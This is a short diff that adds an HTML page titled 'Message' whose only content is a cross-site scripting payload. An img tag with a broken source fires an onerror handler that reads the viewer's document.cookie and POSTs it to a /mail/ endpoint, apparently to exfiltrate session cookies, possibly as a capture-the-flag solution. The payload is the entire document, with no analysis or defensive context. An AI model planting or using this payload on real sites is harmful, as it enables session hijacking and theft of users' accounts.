@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Message</title>
+</head>
+<body>
+
+<img src="x" onerror="fetch('/mail/', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({content:document.cookie})})">
+
+</body>
+</html>
